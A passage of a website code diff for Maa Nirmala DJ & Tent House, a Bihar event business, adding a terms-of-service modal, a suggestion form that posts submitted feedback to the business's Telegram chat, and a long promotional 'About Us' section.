+            <p>Maa Nirmala DJ heavily relies on <strong>Laxmikant Tractor Transport</strong> for the delivery of our massive line-array speakers, heavy iron trusses, and DG Sets. The Client is entirely responsible for ensuring that the event venue is fully accessible to heavy tractors and commercial vehicles. If the venue cannot be reached by our transport, additional manual labor charges will be immediately added to the final bill. The setup area must be clean, leveled, and free of debris prior to our arrival.</p>
+
+            <h4>3. Sound Regulations & Local Laws</h4>
+            <p>While we pride ourselves on providing earth-shattering bass and premium high-volume audio, we strictly operate within the legal frameworks of the Banka district and Bihar State authorities. Maa Nirmala DJ will shut down or lower the sound systems if ordered by local police or government officials. The Client is solely responsible for acquiring any necessary local permits or police permissions required to play loud music late into the night. We will not be held liable for events stopped by law enforcement due to a lack of permits.</p>
+
+            <h4>4. Equipment Safety & Damage Liability</h4>
+            <p>Our audio-visual equipment, laser lights, and waterproof pandals are highly expensive, state-of-the-art investments. The Client assumes full financial responsibility for any physical damage, theft, or vandalism of our equipment caused by the Client’s guests, family members, or event attendees. In the event of a physical altercation or riot at the venue, our technicians reserve the absolute right to immediately cut the power, pack up the equipment, and leave the premises to ensure the safety of our staff and gear. No refunds will be issued under these circumstances.</p>
+
+            <h4>5. Unpredictable Weather & Force Majeure</h4>
+            <p>Our premium pandals are designed to be highly water-resistant; however, extreme acts of nature (such as severe cyclonic winds, heavy flooding, or lightning storms) are beyond human control. Maa Nirmala DJ will not be held financially responsible for setup delays or event disruptions caused by extreme weather conditions. For open-air DJ setups, our operators will immediately cover or dismantle electronic equipment (mixers, amplifiers, tops) if rain begins, to prevent electrocution and permanent damage.</p>
+
+            <h4>6. Power Supply Requirements</h4>
+            <p>If the Client chooses not to rent our heavy-duty Silent Generators (DG Sets), the Client must provide a stable, commercial-grade electrical connection. Maa Nirmala DJ will not connect our sensitive amplifiers to fluctuating, low-voltage domestic power lines. Any damage to our equipment caused by faulty venue wiring provided by the Client will be billed directly to the Client.</p>
+
+            <h4>7. Setup and Dismantling Timelines</h4>
+            <p>To deliver our signature cinematic quality, our technical rigging and acoustic teams require guaranteed, uninterrupted access to the venue at least 24 to 48 hours prior to the event start time, depending on the scale of the pandal and DJ rig. Once the event concludes, the Client must allow our crew sufficient time (up to 12 hours) to safely dismantle the heavy iron trusses, lighting arrays, and audio equipment. Any delays caused by the venue or the Client will incur waiting charges.</p>
+            <h4>8. Crew Hospitality & Basic Amenities</h4>
+            <p>The construction of massive architectural pandals and the deployment of stadium-grade sound systems require immense physical labor. The Client is kindly requested to provide basic hospitality, including safe drinking water, standard meals, and access to clean washrooms for our ground crew, technicians, and the Laxmikant Tractor Transport drivers during the entirety of the setup, event execution, and dismantling phases.</p>
+            <h4>9. Pyrotechnics & Fire Safety Regulations</h4>
+            <p>If the Client has opted for our cold spark pyro machines, heavy ground fog, or any special atmospheric effects, strictly no open flames, unauthorized fireworks, or flammable materials are permitted within a 20-foot radius of our equipment and the main stage. Maa Nirmala DJ prioritizes absolute safety; our technicians reserve the right to refuse the use of pyrotechnics if the crowd becomes unruly or if the pandal conditions are deemed a fire hazard.</p>
+            <h4>10. Out-of-Station Logistics & Travel</h4>
+            <p>While we are deeply rooted in Beltikri and the Katoria region, we frequently execute premium events across the wider Banka district and beyond. For all out-of-station bookings, additional logistical fees, toll taxes, commercial vehicle entry taxes, and basic overnight accommodation for our core technical operators must be provided or reimbursed by the Client.</p>
+            <h4>11. Overtime & Extended Play Charges</h4>
+            <p>Our standard DJ and event operation packages are booked for specific, pre-agreed timeframes. If the Client wishes to extend the music, lighting, or generator services beyond the contracted end time, strictly enforced hourly overtime charges will apply. These charges must be approved by our management on-site and paid before the extended session begins.</p>
+            <h4>12. Drone Clearances & Venue Restrictions</h4>
+            <p>For packages including cinematic broadcasting and aerial drone videography, it is the sole responsibility of the Client to ensure that the venue management allows drone flights. Maa Nirmala DJ will not be responsible for grounded drones due to sudden venue restrictions, overhead high-tension electrical wires, or local no-fly zone enforcement by authorities.</p>
+            <h4>13. Floral Integrity & Decor Protection</h4>
+            <p>Our elite floral designs, Varmala stages, and imported luxury draperies are crafted with meticulous care. The Client must ensure that guests do not pull, dismantle, or destroy the floral arrangements, premium VIP seating, or carpets during the celebration. Severe damage to our decorative inventory, including burns on carpets or torn imported fabrics, will be evaluated and added to the final damage invoice.</p>
+            <h4>14. Exclusivity Clause</h4>
+            <p>To maintain our undisputed standard of quality, Maa Nirmala DJ & Tent House must be the exclusive provider of audio, lighting, and primary tenting at the contracted venue. We do not permit third-party, local DJs or decorators to plug into our high-end mixers or alter our structural trusses, as this compromises our equipment safety and the overall premium aesthetic we guarantee.</p>
+            <h4>15. Security of Stage & VIP Areas</h4>
+            <p>The DJ booth, LED wall control stations, and generator staging areas are highly restricted zones. The Client is responsible for ensuring that intoxicated guests or unauthorized individuals do not enter these technical zones. Spilling beverages on our digital consoles or tampering with heavy electrical cables will result in an immediate halt of the event until the area is secured.</p>
+            <h4>16. Substitute Equipment Policy</h4>
+            <p>In the highly unlikely event of an unexpected mechanical failure or technical malfunction before an event, Maa Nirmala DJ reserves the right to substitute the specified equipment (such as a specific speaker model or lighting fixture) with an alternative of equal or greater premium quality to ensure the event proceeds flawlessly without interruption.</p>
+            <h4>17. Promotional Media Rights</h4>
+            <p>Maa Nirmala DJ & Tent House reserves the right to capture photographs, audio recordings, and video footage of our stage setups, lighting arrays, and DJ performances during the event. By booking us, the Client grants us permission to use these media assets for our official portfolio, social media platforms, and future marketing campaigns to showcase our cinematic capabilities.</p>
+            <h4>18. On-Site Management Authority</h4>
+            <p>All technical, logistical, and operational decisions made on the ground are at the absolute discretion of our core management team. Our highly dedicated managers, including Mr. Sildhar Kumar and Mr. Om Kumar, alongside our founder, have the final authority regarding equipment placement and safety protocols. Any abusive language or physical threats directed at our staff will result in the immediate and total withdrawal of our services without a refund.</p>
+            <h4>19. Legal Jurisdiction & Dispute Resolution</h4>
+            <p>Maa Nirmala DJ & Tent House operates with the highest standards of business integrity. However, in the rare event of a financial dispute, breach of contract, or severe property damage, all legal matters, claims, and arbitration will be handled exclusively under the jurisdiction of the honorable courts located in the Banka district of Bihar.</p>
+            <h4>20. Binding Acceptance of Terms</h4>
+            <p>By remitting the initial advance payment and confirming the booking date, the Client formally acknowledges that they have read, understood, and agreed to be legally bound by all 20 clauses of this comprehensive Official Policy. This agreement ensures a transparent, secure, and spectacularly successful partnership between you and Maa Nirmala DJ & Tent House.</p>
+
+            <p style="text-align: center; margin-top: 30px; font-weight: bold; color: #D4AF37;">
+                By confirming a booking with Maa Nirmala DJ & Tent House, you acknowledge that you have read, understood, and agreed to all the terms stated above.
+            </p>
+        </div>
+    </div>
+</div>
+
+<script>
+    // Open the Terms Modal
+    function openTermsModal() { 
+        document.getElementById('termsModalOverlay').style.display = 'flex'; 
+    }
+    
+    // Close the Terms Modal
+    function closeTermsModal() { 
+        document.getElementById('termsModalOverlay').style.display = 'none'; 
+    }
+    
+    // Close when clicking the dark background outside the box
+    function closeTermsOnOutsideClick(event) {
+        if (event.target.id === 'termsModalOverlay') { 
+            closeTermsModal(); 
+        }
+    }
+</script>
+        <a href="javascript:void(0)" class="side-link premium-animated-btn" onclick="toggleMenu(); openSuggestionModal()">
+    <i class="fas fa-lightbulb"></i> Business Suggestion
+</a>
+
+<style>
+    /* Animated Two-Color Gradient for the Sidebar Button */
+    .premium-animated-btn {
+        background: linear-gradient(90deg, #D4AF37, #6a11cb, #D4AF37);
+        background-size: 200% 200%;
+        animation: twoColorFlow 3s ease infinite;
+        color: #ffffff !important;
+        border: 1px solid rgba(212, 175, 55, 0.5);
+        border-radius: 8px;
+        margin-top: 10px;
+        font-weight: 800;
+        text-shadow: 0 2px 4px rgba(0,0,0,0.5);
+        box-shadow: 0 5px 15px rgba(106, 17, 203, 0.4);
+    }
+    .premium-animated-btn i {
+        animation: iconPulse 1.5s infinite;
+        color: #ffffff;
+    }
+    
+    @keyframes twoColorFlow {
+        0% { background-position: 0% 50%; }
+        50% { background-position: 100% 50%; }
+        100% { background-position: 0% 50%; }
+    }
+    @keyframes iconPulse {
+        0% { transform: scale(1); text-shadow: 0 0 5px #fff; }
+        50% { transform: scale(1.2); text-shadow: 0 0 15px #D4AF37; }
+        100% { transform: scale(1); text-shadow: 0 0 5px #fff; }
+    }
+
+    /* Dark Blurred Overlay */
+    #suggestionModalOverlay {
+        display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+        background: rgba(5, 5, 8, 0.95); backdrop-filter: blur(10px);
+        z-index: 999999; justify-content: center; align-items: center;
+        animation: fadeInOverlay 0.3s ease;
+    }
+    
+    /* The Two-Color Premium Suggestion Box */
+    .mn-suggestion-box {
+        background: linear-gradient(135deg, #0a0a0c 0%, #100a1c 100%); 
+        border: 2px solid;
+        border-image-slice: 1;
+        border-width: 2px;
+        border-image-source: linear-gradient(90deg, #D4AF37, #6a11cb);
+        border-radius: 16px; width: 95%; max-width: 520px; 
+        padding: 25px; position: relative;
+        box-shadow: 0 20px 50px rgba(0,0,0,0.9), inset 0 0 20px rgba(106, 17, 203, 0.2);
+        animation: slideDownFade 0.4s cubic-bezier(0.25, 0.8, 0.25, 1) forwards;
+    }
+
+    /* Advanced Input Styling */
+    .s-input {
+        width: 100%; padding: 12px 15px; background: rgba(255, 255, 255, 0.05);
+        border: 1px solid rgba(212, 175, 55, 0.3); color: #fff; border-radius: 8px;
+        outline: none; font-family: 'Outfit', sans-serif; box-sizing: border-box;
+        transition: all 0.3s ease; margin-bottom: 12px;
+    }
+    .s-input:focus {
+        border-color: #6a11cb; background: rgba(106, 17, 203, 0.05); box-shadow: 0 0 12px rgba(106, 17, 203, 0.4);
+    }
+    .s-input::placeholder { color: #888; }
+    
+    /* Submit Button */
+    .s-submit-btn {
+        background: linear-gradient(90deg, #D4AF37, #6a11cb);
+        background-size: 200% 200%;
+        animation: twoColorFlow 3s ease infinite;
+        color: #fff; font-weight: bold; padding: 15px; border: none; border-radius: 8px; 
+        cursor: pointer; font-size: 16px; margin-top: 5px; transition: 0.3s; 
+        font-family: 'Outfit', sans-serif; box-shadow: 0 5px 15px rgba(106, 17, 203, 0.4);
+    }
+</style>
+
+<div id="suggestionModalOverlay" onclick="closeSuggestionOnOutsideClick(event)">
+    <div class="mn-suggestion-box" id="suggestionBoxContent">
+        <span onclick="closeSuggestionModal()" style="position:absolute; top:15px; right:20px; color:#D4AF37; font-size:35px; line-height:1; cursor:pointer; transition:0.3s;">&times;</span>
+        
+        <h2 style="font-family:'Cinzel',serif; color:#D4AF37; text-align:center; margin-top:0; border-bottom:1px solid rgba(212,175,55,0.3); padding-bottom:15px; font-size: 24px; font-weight:800; letter-spacing:1px;">
+            <i class="fas fa-gem"></i> Business Suggestion
+        </h2>
+        
+        <p style="color:#aaa; text-align:center; font-family:'Outfit', sans-serif; font-size:13px; margin-bottom:20px;">
+            Help Maa Nirmala DJ become the #1 in Bihar. We value your premium feedback!
+        </p>
+        
+        <div style="display:flex; flex-direction:column; margin-top: 15px;">
+            <div style="display:flex; gap:10px;">
+                <input type="text" id="s-name" class="s-input" placeholder="Your Good Name *">
+                <input type="tel" id="s-phone" class="s-input" placeholder="Phone Number *">
+            </div>
+            
+            <select id="s-category" class="s-input" style="color:#ddd;">
+                <option value="" disabled selected style="color:#000;">What do you want to improve? *</option>
+                <option value="Audio / DJ Quality" style="color:#000;">Audio / DJ Quality</option>
+                <option value="Tent & Pandal Design" style="color:#000;">Tent & Pandal Design</option>
+                <option value="Pricing & Packages" style="color:#000;">Pricing & Packages</option>
+                <option value="Staff & Service" style="color:#000;">Staff & Service</option>
+                <option value="New Technology Ideas" style="color:#000;">New Technology Ideas</option>
+            </select>
+            
+            <textarea id="s-desc" class="s-input" rows="4" placeholder="Write your brilliant suggestion here... *" style="resize:none;"></textarea>
+            
+            <button id="submitSuggestionBtn" class="s-submit-btn" onclick="submitSuggestion()">
+                <i class="fas fa-paper-plane"></i> SUBMIT SUGGESTION
+            </button>
+        </div>
+    </div>
+</div>
+
+<script>
+    // Open the Suggestion Modal
+    function openSuggestionModal() { 
+        document.getElementById('suggestionModalOverlay').style.display = 'flex'; 
+    }
+    
+    // Close the Suggestion Modal
+    function closeSuggestionModal() { 
+        document.getElementById('suggestionModalOverlay').style.display = 'none'; 
+    }
+    
+    // Close when clicking the dark background outside the box
+    function closeSuggestionOnOutsideClick(event) {
+        if (event.target.id === 'suggestionModalOverlay') { 
+            closeSuggestionModal(); 
+        }
+    }
+    
+    // Advanced Suggestion Logic to Telegram
+    function submitSuggestion() {
+        if(typeof playTap === 'function') playTap();
+        const name = document.getElementById('s-name').value; 
+        const phone = document.getElementById('s-phone').value; 
+        const category = document.getElementById('s-category').value; 
+        const desc = document.getElementById('s-desc').value;
+        
+        // Validation
+        if(!name || !phone || !category || !desc) { 
+            alert("⚠️ Please fill all required (*) fields to submit your premium suggestion!"); return; 
+        }
+        
+        // Loading State
+        const btn = document.getElementById('submitSuggestionBtn'); 
+        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> SENDING...'; 
+        btn.style.opacity = '0.7';
+        
+        // Exact Day, Date, and Time Calculation
+        const now = new Date(); 
+        const exactDay = now.toLocaleDateString('en-IN', { weekday: 'long' }); 
+        const exactDate = now.toLocaleDateString('en-IN', { year: 'numeric', month: 'long', day: 'numeric' }); 
+        const exactTime = now.toLocaleTimeString('en-IN', { hour: '2-digit', minute: '2-digit', hour12: true });
+        
+        // Telegram Message Formatting
+        const msg = `💡 *NEW BUSINESS SUGGESTION* 💡\n---------------------------\n🗓️ *Day:* ${exactDay}\n📅 *Date:* ${exactDate}\n⏰ *Time:* ${exactTime}\n\n👤 *Client Name:* ${name}\n📞 *Contact:* ${phone}\n\n🎯 *Improvement Area:* ${category}\n📝 *Suggestion Details:*\n${desc}\n\n🌟 *Let's make Maa Nirmala DJ the best!*`;
+        
+        // Send to Telegram
+        fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, { 
+            method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: TG_CHAT, text: msg, parse_mode: 'Markdown' }) 
+        }).then(res => { 
+            btn.innerHTML = '<i class="fas fa-check"></i> SUGGESTION SENT!'; 
+            btn.style.background = '#00ff00'; btn.style.color = '#000';
+            
+            // Reset and Close after 2 seconds
+            setTimeout(() => { 
+                closeSuggestionModal(); 
+                btn.innerHTML = '<i class="fas fa-paper-plane"></i> SUBMIT SUGGESTION'; 
+                btn.style.background = ''; // Resets to CSS gradient
+                btn.style.color = '#fff'; btn.style.opacity = '1'; 
+                document.getElementById('s-name').value=''; document.getElementById('s-phone').value=''; document.getElementById('s-category').value=''; document.getElementById('s-desc').value=''; 
+            }, 2000); 
+        }).catch(err => { 
+            alert("Network Error. Please try again later!"); 
+            btn.innerHTML = '<i class="fas fa-paper-plane"></i> SUBMIT SUGGESTION'; 
+            btn.style.opacity = '1'; 
+        });
+    }
+</script>
+        <a href="javascript:void(0)" class="side-link" onclick="toggleMenu(); openAboutModal()">
+    <i class="fas fa-info-circle"></i> About Us
+</a>
+
+<style>
+    /* Dark Blurred Overlay */
+    #aboutModalOverlay {
+        display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+        background: rgba(5, 5, 8, 0.95); backdrop-filter: blur(12px);
+        z-index: 999999; justify-content: center; align-items: center;
+        animation: fadeInOverlay 0.4s ease;
+    }
+    
+    /* The Full-Screen Premium Gold Box */
+    .mn-about-box {
+        background: linear-gradient(135deg, #120f0a 0%, #050507 100%); 
+        border: 2px solid #D4AF37; border-radius: 16px; 
+        width: 98%; max-width: 1000px; /* Massive width for full-screen feel */
+        height: 95vh; /* Takes up 95% of the screen height */
+        display: flex; flex-direction: column;
+        position: relative; overflow: hidden;
+        box-shadow: 0 25px 60px rgba(0,0,0,0.95), inset 0 0 30px rgba(212, 175, 55, 0.15);
+        animation: slideUpZoom 0.5s cubic-bezier(0.25, 0.8, 0.25, 1) forwards;
+    }
+
+    @keyframes slideUpZoom {
+        from { opacity: 0; transform: translateY(50px) scale(0.95); }
+        to { opacity: 1; transform: translateY(0) scale(1); }
+    }
+
+    /* Header Area */
+    .about-header {
+        background: linear-gradient(to bottom, rgba(212, 175, 55, 0.15), transparent); 
+        padding: 25px 20px; border-bottom: 1px solid rgba(212, 175, 55, 0.4);
+        text-align: center; position: relative;
+    }
+    
+    /* Scrollable Text Area */
+    .about-content-area {
+        flex-grow: 1; padding: 35px 40px; overflow-y: auto; color: #cccccc;
+        font-family: 'Outfit', sans-serif; font-size: 16px; line-height: 1.9; text-align: justify;
+    }
+    
+    /* Custom Gold Scrollbar */
+    .about-content-area::-webkit-scrollbar { width: 8px; }
+    .about-content-area::-webkit-scrollbar-track { background: rgba(0,0,0,0.3); border-radius: 10px; }
+    .about-content-area::-webkit-scrollbar-thumb { background: #D4AF37; border-radius: 10px; border: 1px solid #000; }
+    
+    /* Typography inside the About Section */
+    .about-content-area h3 {
+        color: #D4AF37; font-family: 'Cinzel', serif; font-size: 24px; 
+        margin-top: 35px; margin-bottom: 15px; letter-spacing: 1px; font-weight: 800;
+        text-transform: uppercase; border-left: 4px solid #D4AF37; padding-left: 15px;
+    }
+    .about-content-area h3:first-child { margin-top: 0; }
+    .about-content-area p { margin-bottom: 20px; font-weight: 300; }
+    .about-content-area strong { color: #ffffff; font-weight: 600; }
+    
+    /* Responsive adjustments for mobile */
+    @media (max-width: 600px) {
+        .about-content-area { padding: 20px 15px; font-size: 15px; }
+        .about-content-area h3 { font-size: 18px; }
+    }
+</style>
+
+<div id="aboutModalOverlay" onclick="closeAboutOnOutsideClick(event)">
+    <div class="mn-about-box" id="aboutBoxContent">
+        
+        <div class="about-header">
+            <span onclick="closeAboutModal()" style="position:absolute; top:20px; right:25px; color:#D4AF37; font-size:40px; line-height:1; cursor:pointer; transition:0.3s; text-shadow: 0 0 10px rgba(212,175,55,0.5);">&times;</span>
+            <h2 style="margin:0; color:#D4AF37; font-family:'Cinzel', serif; font-size:32px; font-weight:900; letter-spacing:2px; text-transform: uppercase;">
+                <i class="fas fa-crown"></i> The Legacy of Maa Nirmala
+            </h2>
+            <p style="margin:8px 0 0 0; color:#e0e0e0; font-size:14px; font-family:'Outfit', sans-serif; letter-spacing: 1px;">Pioneers of Premium Celebrations in Banka, Bihar</p>
+        </div>
+        
+        <div class="about-content-area">
+            <h3>Chapter I: The Genesis & Vision</h3>
+            <p>Welcome to the grand universe of <strong>Maa Nirmala DJ & Tent House</strong>. Rooted deeply in the historic and culturally vibrant soil of Beltikri, Kaddhar, Katoria, located in the prestigious Banka district of Bihar (Pin: 813106), our establishment has risen from humble beginnings to become the undisputed titan of event management and luxury celebrations. Founded and spearheaded by the visionary <strong>Mr. Lalu Kumar Tanti</strong>, Maa Nirmala DJ was born out of a singular, unyielding passion: to transform ordinary human gatherings into breathtaking, cinematic masterpieces. We recognized early on that a wedding, a district festival, or a grand anniversary is not merely a date on a calendar; it is a profound milestone. Under Mr. Lalu's meticulous direction, alongside a fiercely dedicated management team including <strong>Sildhar Kumar, Anil Kumar, and Sanjay Kumar</strong>, we have engineered a company that operates on the principles of absolute perfection, zero compromises on quality, and an unwavering commitment to our clients' joy.</p>
+
+            <h3>Chapter II: The Supremacy of Acoustic Engineering</h3>
+            <p>The true heartbeat of any monumental celebration lies in its sound, and at Maa Nirmala DJ, our acoustic engineering is quite simply second to none. We do not just play music; we manipulate soundwaves to captivate the human soul. Our audio arsenal consists of industry-leading, heavy-duty dual subwoofers capable of pushing massive volumes of air, creating an earth-shattering bass response that reverberates through the very ground you stand on. This low-end raw power is perfectly balanced by our deployment of crystal-clear, high-frequency line-array top speakers. Whether we are amplifying the sacred, ancient Sanskrit chants of a traditional wedding ceremony or unleashing high-octane electronic drops for a midnight Baaraat trolley, our state-of-the-art mixers and digital crossovers ensure that every vocal is crisp and every beat is free of distortion. From intimate Haldi ceremonies to our <strong>Mega Concert DJ Rigs</strong> designed for thousands of attendees, we dominate the auditory landscape.</p>
+
+            <h3>Chapter III: Architectural Grandeur & Royal Pandals</h3>
+            <p>Moving beyond the realm of music, our premium tent house division specializes in the construction of temporary palaces. We understand that the physical environment of an event dictates its prestige. Therefore, we utilize heavy-duty, industrial-grade iron trusses and highly secure rigging systems to construct massive waterproof pandals that defy unpredictable weather. We drape these magnificent structures in miles of imported, vibrantly colored luxury fabrics, cascading elegantly from towering ceilings to create intricate geometric and floral patterns. The interior of every Maa Nirmala setup is a sanctuary of royal comfort, featuring <strong>Premium VIP Seating Arrangements</strong>, immaculate wall-to-wall carpeting, and majestic stage decorations. Our bespoke floral archways and illuminated entrance gates (Dwar) are meticulously crafted to welcome your guests into a world of pure, unadulterated enchantment.</p>
+
+            <h3>Chapter IV: Cinematic Visuals & Intelligent Lighting</h3>
+            <p>To illuminate our architectural masterpieces and sync with our heavy bass audio, our lighting technicians paint the night sky using highly intelligent, programmable DMX lighting arrays. We deploy sweeping, synchronized 3D laser shows, brilliant LED wash lights, and powerful moving head beams that track the tempo of the music, creating an immersive, multi-sensory environment that rivals professional stadium concerts. By seamlessly introducing cinematic atmospheric effects such as heavy ground fog and safe cold spark pyro machines during key emotional moments—such as the bride and groom's grand entrance or the cutting of the cake—we elevate the visual impact of your evening to legendary status.</p>
+
+            <h3>Chapter V: Unyielding Logistics & Power Infrastructure</h3>
+            <p>The hallmark of a truly premium service is what happens behind the scenes. An event of massive magnitude requires unbreakable logistical supremacy. Recognizing the unpredictability of local power grids, Maa Nirmala provides absolute electrical reliability through our massive, heavy-duty Silent Generators (DG Sets), ensuring your event never experiences a single millisecond of darkness. Furthermore, our invisible backbone is our formidable logistical network. Supported powerfully by <strong>Laxmikant Tractor Transport</strong>, we possess the sheer mechanical might to deliver colossal payloads of heavy subwoofers, iron pillars, and delicate lighting fixtures to any venue, no matter how remote the location. We arrive with military-like precision, construct with undeniable passion, and manage every technical detail flawlessly.</p>
+
+            <h3>Chapter VI: Our Promise to You</h3>
+            <p>For years, the communities of Beltikri, Katoria, and the greater Banka region have placed their ultimate trust in us during their most precious moments. When you hire <strong>Maa Nirmala DJ & Tent House</strong>, you are not simply renting equipment; you are partnering with a legacy of excellence. We leave nothing to chance, we accept no excuses, and we let our spectacular, awe-inspiring results speak for themselves. From the first phone call to the final beat of the music, we are devoted entirely to your celebration. Choose the best. Choose Maa Nirmala.</p>
+            <h3>Chapter VII: The Culinary Symphony & Elite Catering</h3>
+            
+<p>Beyond the auditory and visual spectacles, Maa Nirmala DJ & Tent House recognizes that the soul of any legendary Indian celebration is the grand feast. Our expanded elite catering division is a masterclass in culinary excellence, designed to satisfy the most discerning palates of Bihar and beyond. We do not merely serve food; we curate an extraordinary sensory journey through the rich heritage of authentic traditional flavors and sophisticated international delicacies. Our kitchen is helmed by masterful chefs who utilize organic, locally sourced ingredients to prepare a massive, mouth-watering array of dishes. From the smoky, traditional perfection of Bihar's famous Litti Chokha to sophisticated multi-cuisine buffets featuring rich curries, artisanal breads, and decadent desserts, our menu is boundless. We deploy a sophisticated infrastructure of heavy-duty industrial burners and highly hygienic cold-storage units to ensure every single morsel is served at the absolute peak of freshness. Our service staff, trained rigorously in the highest standards of VIP hospitality, move with invisible grace among your guests, ensuring that every premium plate is replenished and every crystal water glass is full. We provide luxurious bone china crockery, polished stainless steel cutlery, and exquisitely decorated, themed food stalls that align perfectly with your event's royal ambiance. At Maa Nirmala, we believe that the memory of a spectacular, royal banquet lingers in the minds of your guests just as long as the echoing bass of our music.</p>
+
+<h3>Chapter VIII: Botanical Architecture & Floral Design</h3>
+<p>To perfectly complement our towering architectural pandals, Maa Nirmala employs a specialized team of elite floral architects who possess the unique ability to transform raw, empty spaces into blooming, vibrant paradises. We deeply understand that flowers carry the emotional weight of a ceremony, symbolizing purity, new beginnings, and grand celebration. Our expansive sourcing network brings in the absolute freshest Marigolds, exotic Orchids, deep Red Roses, and intensely fragrant Jasmine from the finest botanical gardens across the country, ensuring an explosion of breathtaking color and enchanting scent at your venue. We specialize in creating high-impact, larger-than-life floral installations, including massive twenty-foot "Varmala" stages, cascading floral ceilings, and intricate, welcoming "Rangoli" patterns that greet your esteemed guests at the illuminated Dwar. Our technical crew utilizes hidden, state-of-the-art misting systems to keep the flora dew-fresh and vibrant, even under the intense heat of our powerful stage lights and the warm Bihar climate. Each arrangement is a bespoke, one-of-a-kind creation, carefully tailored to the specific color palette and emotional tone of your wedding or festival. Whether it is a traditional "Genda Phool" theme for a lively Haldi ceremony or a modern, minimalist white lily aesthetic for a high-profile VIP reception, our meticulous floral designs provide the perfect, organic backdrop for your cinematic photographs.</p>
+
+<h3>Chapter IX: Digital Integration & Cinematic Broadcasting</h3>
+<p>In this modern, hyper-connected era, a grand event in the Banka district deserves to be seen, celebrated, and remembered by the entire world. Maa Nirmala DJ & Tent House has boldly pioneered the integration of high-end digital media services directly into our premium event packages. We deploy a sophisticated network of ultra-high-definition (4K) LED wall screens that serve as a dynamic, glowing canvas for the main stage, displaying crystal-clear live feeds of the ceremony, cinematic pre-wedding montages of the couple, or vibrant, pulsating motion graphics that sync flawlessly with our DJ's earth-shaking rhythm. Our technical team works hand-in-hand with professional-grade videographers, utilizing overhead jib cranes and stabilized cinematic drones to capture every emotional tear, every joyous laugh, and every energetic dance move from breathtaking aerial and dynamic ground angles. For families who have loved ones residing abroad or across the country, we offer seamless, high-speed live streaming services to major global platforms, ensuring that physical distance is absolutely no barrier to joining the monumental celebration. By seamlessly merging the deep-rooted cultural traditions of a Beltikri celebration with cutting-edge digital broadcasting technology, Maa Nirmala ensures your event is not just a local gathering, but a globally accessible, high-tech cinematic production.</p>
+
+<h3>Chapter X: The Unstoppable Fleet & Heavy Logistics</h3>
+<p>The unseen, unsung hero of every flawless Maa Nirmala production is our absolute mastery of heavy logistics and large-scale transportation. Delivering a royal palace of heavy iron trusses, miles of luxury fabric, and thousands of watts of audio equipment requires an unbreakable mechanical backbone. This is where our formidable logistical partner, <strong>Laxmikant Tractor Transport</strong>, comes into play. Powered by an unstoppable fleet of heavy-duty farming tractors and heavy-payload trailers, we possess the sheer mechanical might and rugged endurance to deliver colossal payloads of dual subwoofers, massive iron pillars, and delicate, intelligent lighting fixtures to any venue, no matter how remote, unpaved, or challenging the location might be. Our drivers and logistical crew navigate the terrains of Katoria, Banka, and beyond with military-like precision and absolute punctuality. We do not let muddy roads or difficult access points dictate the quality of your event. The Laxmikant Tractor Transport fleet ensures that our massive infrastructure arrives safely, allowing our rigging teams to begin construction on time, every time. This unyielding logistical supremacy guarantees that from the moment you book us, the physical realization of your grandest dreams is in the most capable, powerful hands in the industry.</p>
+
+<h3>Chapter XI: Mega Concerts & District Festivals</h3>
+<p>While our reputation was forged in the fires of luxury weddings and grand anniversaries, the sheer scale of Maa Nirmala's infrastructure naturally evolved to dominate the arena of mega-events. We are the premier, go-to technical powerhouse for massive district-level festivals, high-profile political rallies, large-scale corporate summits, and deeply spiritual Maha-Aartis across Bihar. When the audience size swells from hundreds into the thousands, our engineering approach shifts from intimate luxury to stadium-grade power. We deploy expanded line-array configurations capable of throwing crystal-clear audio across massive open maidans, ensuring that the person in the very last row experiences the exact same vocal clarity and thumping bass as the VIPs in the front. Our tenting division scales up proportionately, constructing colossal, weatherproof domes supported by reinforced steel, capable of safely sheltering thousands of attendees. We coordinate complex, multi-stage lighting transitions and manage massive power grids using synchronized arrays of our heavy-duty Silent Generators. Handling an event of this magnitude requires nerves of steel and flawless execution, and our veteran crew has proven time and time again that Maa Nirmala is not just an event manager, but a towering pillar of large-scale public entertainment and crowd management.</p>
+
+<h3>Chapter XII: The Philosophy of Customer Devotion</h3>
+<p>At the very core of our massive inventory of subwoofers, lasers, and iron trusses lies a simple, unbreakable philosophy: absolute devotion to our clients. <strong>Mr. Lalu Kumar Tanti</strong> built Maa Nirmala DJ & Tent House not just as a business, but as an institution of trust. We understand that our clients come to us during the most important, high-stakes moments of their lives—moments that cannot be repeated or rescheduled. Therefore, under the vigilant and tireless coordination of our top-tier management team, including <strong>Sildhar Kumar, Anil Kumar, and Sanjay Kumar</strong>, we operate on a strict "Zero Excuses" policy. From the initial, detailed consultation to the final dismantling of the stage, our clients experience a level of personalized, round-the-clock service that is unparalleled in the industry. We listen intently to your unique vision, we anticipate potential challenges before they arise, and we execute with a passionate intensity as if it were a celebration within our own family. Our team remains on-site, vigilant, and ready to adapt instantly to any last-minute changes or requests. This unwavering dedication to customer satisfaction is the true secret behind our legacy, transforming first-time clients into lifelong patrons.</p>
+
+<h3>Chapter XIII: Sustainable Celebrations & Community Impact</h3>
+<p>True greatness is not merely measured by the volume of our speakers or the height of our pandals, but by the positive impact we leave on our beloved community. Rooted deeply in Beltikri (Pin: 813106), Maa Nirmala DJ & Tent House takes immense pride in being an engine of local economic growth and community empowerment. We actively employ dozens of hardworking individuals from the Kaddhar and Katoria regions, providing them with rigorous technical training in acoustic engineering, rigging, and hospitality. By partnering with local artisans for our fabrics and sourcing our catering ingredients from local farmers, we ensure that the wealth generated by your celebrations directly enriches the Banka district. Furthermore, as an industry leader, we are deeply conscious of our environmental footprint. We have heavily invested in the latest generation of ultra-efficient, low-emission Silent DG Sets that drastically reduce noise pollution and exhaust, ensuring that our massive power needs do not harm the natural beauty of our surroundings. We utilize eco-friendly, reusable staging materials wherever possible, ensuring that our breathtaking celebrations remain deeply respectful of the environment and the vibrant community that supports us.</p>
+
+<h3>Chapter XIV: Future Innovations & The Next Decade</h3>
